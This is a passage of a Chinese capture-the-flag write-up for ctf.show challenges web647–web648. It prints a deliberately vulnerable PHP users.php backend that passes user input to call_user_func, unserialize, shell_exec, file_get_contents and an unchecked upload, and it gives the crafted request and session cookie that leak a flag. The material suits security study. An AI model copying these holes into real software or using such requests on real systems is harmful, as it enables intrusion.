class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$u</span>)[<span class="number">0</span>],</span><br><span class="line">			<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$pass</span>,</span><br><span class="line">			<span class="string">&#x27;isAdmin&#x27;</span>=&gt;<span class="variable">$isadmin</span>,</span><br><span class="line">			<span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span></span><br><span class="line">		));</span><br><span class="line">		<span class="variable">$index</span> +=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="variable">$index</span>;</span><br><span class="line">	<span class="variable">$start</span> = (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="title function_ invoke__">array_slice</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$start</span>,<span class="variable">$limit</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;添加成功&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户已存在&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;更新成功&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户不存在或无权更新&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;删除成功&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;用户不存在或无权删除&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backupUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$file_name</span> = DB_PATH;</span><br><span class="line">	<span class="keyword">if</span> (! <span class="title function_ invoke__">file_exists</span> (<span class="variable">$file_name</span> )) &#123;    </span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 NOT FOUND&#x27;</span>);  </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">	    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span> (<span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span> ); </span><br><span class="line">	    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-type: application/octet-stream&quot;</span> ); </span><br><span class="line">	    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Ranges: bytes&quot;</span> );  </span><br><span class="line">	    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Accept-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>));  </span><br><span class="line">	    <span class="title function_ invoke__">Header</span> ( <span class="string">&quot;Content-Disposition: attachment; filename=backup.dat&quot;</span>);     </span><br><span class="line">	    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(FLAG645, <span class="string">&#x27;flag就在这里，可惜不能给你&#x27;</span>, <span class="title function_ invoke__">fread</span> ( <span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span> (<span class="variable">$file_name</span>)));    </span><br><span class="line">	    <span class="title function_ invoke__">fclose</span> ( <span class="variable">$file</span> );    </span><br><span class="line">	    <span class="keyword">exit</span> ();    </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span>(<span class="params"><span class="variable">$total</span>, <span class="variable">$times</span>, <span class="variable">$min</span>, <span class="variable">$max</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$min</span> * <span class="variable">$times</span> &gt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$max</span> * <span class="variable">$times</span> &lt; <span class="variable">$total</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$times</span> &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$times</span>--;</span><br><span class="line">            <span class="variable">$kmix</span> = <span class="title function_ invoke__">max</span>(<span class="variable">$min</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$max</span>);</span><br><span class="line">            <span class="variable">$kmax</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$max</span>, <span class="variable">$total</span> - <span class="variable">$times</span> * <span class="variable">$min</span>);</span><br><span class="line">            <span class="variable">$kAvg</span> = <span class="variable">$total</span> / (<span class="variable">$times</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$kDis</span> = <span class="title function_ invoke__">min</span>(<span class="variable">$kAvg</span> - <span class="variable">$kmix</span>, <span class="variable">$kmax</span> - <span class="variable">$kAvg</span>);</span><br><span class="line">            <span class="variable">$r</span> = ((<span class="keyword">float</span>)(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) / <span class="number">10000</span>) - <span class="number">0.5</span>) * <span class="variable">$kDis</span> * <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$k</span> = <span class="title function_ invoke__">round</span>(<span class="variable">$kAvg</span> + <span class="variable">$r</span>);</span><br><span class="line">            <span class="variable">$total</span> -= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$data</span>[] = <span class="variable">$k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recoveryUsers</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;恢复成功&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]&lt;<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">		<span class="variable">$file_name</span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_name</span>, DB_PATH);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">false</span>)&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;数据恢复失败 file_name&#x27;</span>.<span class="variable">$file_name</span>.<span class="string">&#x27; DB_PATH=&#x27;</span>.DB_PATH;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;数据恢复失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpInfoTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authKeyValidate</span>(<span class="params"><span class="variable">$auth</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;验证成功&#x27;</span>:<span class="string">&#x27;验证失败&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;status&#x27;</span>=&gt;<span class="variable">$auth</span>==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>)?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-1&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remoteUpdate</span>(<span class="params"><span class="variable">$auth</span>,<span class="variable">$address</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;更新失败&#x27;</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$auth</span>!==<span class="title function_ invoke__">substr</span>(FLAG645, <span class="number">8</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;权限key验证失败&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$address</span>);</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=(<span class="variable">$content</span>!==<span class="literal">false</span>?<span class="variable">$content</span>:<span class="string">&#x27;地址不可达&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilString</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;372619038&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;you are not 372619038?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilClass</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$ctfshow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;mmmmm?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilNumber</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$number</span> = <span class="title function_ invoke__">getArray</span>(<span class="number">1000</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">999</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$number</span>[<span class="variable">$m</span>]==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;number is right?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilFunction</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;ffffffff&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG649&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;you are not ffffffff?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilArray</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$arrays</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$arrays</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$arrays</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;ctfshow&#x27;</span>, <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$arrays</span>)) &amp;&amp;  <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG650&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;array?&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;命令执行失败&#x27;</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">		<span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilString</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$key</span> = <span class="string">&#x27;372619038&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="variable">$key</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;you are not 372619038?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用特性<code>null!=false</code>或者是<code>session_id</code>都可以解决</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/users.php?action=evilString&amp;m=getenv</span><br></pre></td></tr></table></figure>

<p><code>getenv</code>返回的是数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /system36d/users.php?action=evilString&amp;m=session_id HTTP/1.1</span><br><span class="line">Host: cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show</span><br><span class="line">Cookie: uid=10; cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg; PHPSESSID=372619038</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web648"><a href="#web648" class="headerlink" title="web648"></a>web648</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evilClass</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$m</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$ctfshow</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$m</span>);</span><br><span class="line">	<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>=<span class="variable">$m</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="variable">$m</span>==<span class="variable">$m</span> &amp;&amp; <span class="variable">$k</span>==<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG647&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG648&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;mmmmm?&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

